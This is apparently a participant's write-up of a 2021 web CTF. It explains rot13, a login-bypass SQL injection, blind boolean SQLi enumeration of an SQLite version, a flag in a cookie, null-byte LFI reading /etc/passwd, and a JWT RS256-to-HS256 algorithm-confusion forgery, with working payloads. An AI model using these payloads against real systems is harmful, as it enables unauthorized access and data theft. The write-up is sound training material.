# Writeups for Watchcom sin mini-CTF ved ITDagene 2021
## Warning: Contains spoilers!

## Crypto 1
Points: 500 \
Description:
```
JFT{Jnbj_Jung_n_Pynffvp}
```

This was basic rot13 or caesar cipher, with an offset of 13. 
Solution:
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&input=SkZUe0puYmpfSnVuZ19uX1B5bmZmdnB9

## SQLi 101
Points: 1000 \
Description:
```
https://ctf.watchcom.ninja:11010/
```
As the title suggests, simple SQL injection. We are presented with the following website:

![front page](./sqli-101-1.png)

We assume it is a standard query on the form:
```SQL
SELECT * FROM users WHERE username='$username' AND password='$password';
```
Where `$username` and `$password` is the provided input from the login form.

We can simply bypass this with username: `' or 1=1 -- ` and password blank/anything. This will create the following form:

```SQL
SELECT * FROM users WHERE username='' or 1=1 -- ' AND password='';
```

As we see, the rest of the query will be commented out and we also have a `or 1=1` which is always true, returning the first row in the table. We successfully log in, so seems that our hypothesis is correct.

## SQLi 202
Points: 1500 \
Description:
```
https://ctf.watchcom.ninja:11100/
```
_There is also a hint for 250 points which I didn't unlock, so not sure what it says._

We are presented with the following simple input form:
![input form](./sqli-202-1.png)

Here we are asked to input the database version. I could not find a way to exploit this and was not entirely sure what this query would look like anyway. I assumed maybe something like:
```SQL
SELECT 1 WHERE @@version = '$input';
```
But then I also suspected that the form was not SQL injectable at all, and that it just was a simple text compare in php, so I assumed you should be using the previous challenge instead.

From the previous challenge, we only get 1 bit of output; true or false, as in you login correctly or not. We can abuse this to make our own queries to check statements we want instead of the actual user statement.

So we could use something like: `username`: `' or @@version like '%' -- `. Which would look like:
```SQL
SELECT * FROM users WHERE username='' or @@version like '%' -- ' AND password='';
```

`@@version` is a magic placeholder in many SQL database languages, so if this was one of these, e.g. MySQL/MariaDB then this should return true and we login. Instead we are presented with:

```
SQL Error:
unrecognized token: "@"
```
So we see 1. this query is not valid, meaning the `@@version` is not valid, which further means this is not MySQL/MariaDB. 2. we get an error message which we could abuse to exfiltrate data through error based SQLi exfiltration. I didn't bother with this in this case as it was easier to just go through the manual route.


But we got an error, so now we just need to test some other version tags from other DBMSs, like `v$version` in oracle or `version()` in postgress, but when using `sqlite_version()` we suddenly didn't receive an error, so we have successfully fingerprinted the database.

Now we just need to extract this piece of information. A quick ddg search reveals that the `sqlite_version()` function returns a string on the form `1.2.3.4` meaning just numbers and dots, so then we can use the `LIKE` operator to just test, like `username`: `' or sqlite_version() like '1%' -- `. This would then create a query like

```SQL
SELECT * FROM users WHERE username='' or sqlite_version() like '1%' -- ' AND password='';
```

The `LIKE` operator in SQL is a is a simple text compare that supports some special characters, especially the `%` character which means "any string", so we are here just checking if `sqlite_version()` starts with the letter `1`.

We then enumerate and get something like:
```
' or sqlite_version() like '1%' -- (false)
' or sqlite_version() like '2%' -- (false)
' or sqlite_version() like '3%' -- (true)
' or sqlite_version() like '3.%' -- (true)
' or sqlite_version() like '3.1%' -- (false)
...
' or sqlite_version() like '3.8%' -- (true)
' or sqlite_version() like '3.8.%' -- (true)
' or sqlite_version() like '3.8.7.%' -- (true)
' or sqlite_version() like '3.8.7.1%' -- (true)
' or sqlite_version() like '3.8.7.1' -- (true)
...
```
I ended up doing this manually as just using copy-paste shortcuts and the tab char revealed the version string quicker than it would take to write a script to do this, but you could easily have done so too. Also notice that the last one I removed the `%` char and verified that this was indeed the entire version string. Just paste this into the challenge page and you get the flag.

# Web 102
Points: 500 \
Description:
```
https://ctf.watchcom.ninja:10001/
```
We are presented with the following front page:
![web 102 front page](./web-102-1.png)

We see here from the pop up that this site uses cookies, looking at the cookies we got from the page we see the following:

![web 102 cookies](./web-102-2.png)
Here I'm using the [Cookie Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) extension for easy reading and editing of cookies. We see we got the flag straight away just URL decode the `{}` characters and get the flag.

## Web Dynamic CMS 2.0
Points: 2500 \
Description:
```
https://ctf.watchcom.ninja:12011/
```
This was just a basic LFI (local file inclusion) exploit, but took the longest because I was stupid and didn't spot the flag at first, and then didn't know where to look for it.

So we are presented with the following front page:
![cms front page](./web-cms-1.png)
Nothing much to see here, except for an interesting url. See there is a parameter `file` which takes in the value `file.txt` which we then can assume is read from disk and included in the web page. This looks very much like a classical LFI exploit. We can then try to just change the filename like `?file=flag.txt`. We see we get no errors, but also no content. Then we can try to look for other files like maybe `?file=flag.html`, but we are then redirected to `?file=file.html.txt`. So seems it really wants to append the `.txt` suffix. 

Some old versions of PHP are vulnerable to null bytes, as old native C libraries used to store strings just as raw data and then append a zero byte to the end of the string to signal that the string finished here. So we can try something like `?file=file.txt%00.txt`, which seems to print the same `Welcome to CMS 0.2RC4. ` normally, and assume this to work. We can then see if we can look into other folders, maybe global paths like `?file=/etc/passwd%00.txt`. The `/etc/passwd` is a standard unix file which exists on most unix like operating systems like linux, which I assume this webserver runs. And we can see that the following gets printed:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
WSG{Waow_NOlL_BYtE_WaS_Th3_Way_To_Go}
```
Just as expected, a wall of text of users on the system, so I didn't bother looking more carefully, though had I just read the last line, then I would have been finished at this point.

I then continued to spend another 30 minutes looking for other files on the system, system config files, log files, the php source code, etc, until I randomly checked the `/etc/passwd` file again and just saw the flag was there. -.-

## Web JWT
Points: 5000
Description:
```
https://ctf.watchcom.ninja:11000/
```
We are presented with the following page:
![JWT front page](./web-jwt-1.png)

JWT, json web token, is a common way to store authentication tokens in cookies after authenticating users. We also see the cookie `web9_token` with the JWT token 
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsImlhdCI6MTYxMDk3ODk0N30.iTSDi5aakG9Rz__6O1tYDGRjCFjEvntypw32qScYPJG5NV_OA1MMp84_EcCab5OiJdtEqv8keTLRHwshzbII9HBv--SdhlClr1kCUJwA5mL9TCedgtuMs2-21cg80sL4wS_HMod-JhZ7PNMRU9JxZkilp5si72G9Bm1KU_IP1eUvOpfuvjFZuUySIvEREbnYS06E-QefrZroKVCIXBbzO_I4c0IFHNoUe8wAS-Y8bIi-CEdxjiZYnLp4MPRM9PMrLxCpv-qKTF4rY_nTxh3jDkHw3yicNo_D3ePLOhAnYRlHZ-fLeTd7l5jKREcf68jUpfGkA-W-CfhxUhXjPUxeTQtJ-bL1sTv5QKIsSfnFPzmB9_c4DwMkNc5Ebx-S8leMKPzqNNvDo-PxoSyoRUUVI1cVKPj1Wd0xbJPQaJTpNtVrDB4lrb1ybZkphXSsywdNzJlyyJ53xtOQehvHaJkWkDR8TfRfDaGIqFBmJA0xoFOn003BzGaW_QuPy2LSiN4srHL1S_A4CLHToP9BDxQgBE9YL14YD42rg-P4yC5vWx-68YZd1fMEERTwM80hU9HpxTwdDx20OrhntcCPcnK_1mB_nByx6z78tS7bBPVdEsGuB5ywEi8OLjWVzRixhqUHmcrgn0CGYmf6oSN3TtWq5S8jIbzzFVJi_NqbDpXFV14
```
We can then just paste that into [jwt.io](https://jwt.io/) 
and should get something like the following:
![jwt.io](./web-jwt-2.png)

JWT tokens consist of 3 parts, each base64 encoded and separated with `.` characters. The first part is the header, containing information about what type of token this is, usually contains the algorithm for verification and the type of the next data part.

The second part is the data part, which is the data of the token.

The third and final part is the signature, which was generated by the server using a secret key. This means the server can hand the data to the client in a cookie, the client can easily read the data, but because it is signed with a secret private key, we can not edit the data.

Here we see in the header part that they use the `RSA 256` algorithm, which means it uses a private key for signing and another public key for validation. From the front page of the challenge, we were in this case given the public key which is used for verification.

From the data part we can also see the flag `admin` is set to `false`, so our goal is just to set this flag to `true` and sign the token and reload the page and we should get the flag.

We can however freely edit the token if we want. So what happens if we change the `alg` to `HS256` which is the HMAC 256 algorithm? Well the structure changes a bit. In that case there is only 1 secret key which is used both for signing and also for validation. However we already have the `verification` key, which is just the public key from the RSA scheme. We can then just do something like the following:
![JWT HS256 signed](./web-jwt-3.png)

Here I changed the algorithm to `HS256`, then the `admin` flag to `true` and then pasted in the public key and jwt.io automatically generates the full token with signature in the browser. Notice that you need to take the whole text field, including the `---` parts and new lines. I just base64 encoded this once more and checked the `secret base64 encoded` which makes this secret identical to what the server side library would read.

We can then use this token in the cookie and get our flag.

TLDR;
They didn't validate the `alg` field allowing us to set the type to HS256 which uses the same secret key for verification and generation. To fix this, they should first read the type from the token, check if it is supported, and if they want to support both HS256 and RS256, then they should have server logic that uses different verification keys before validating.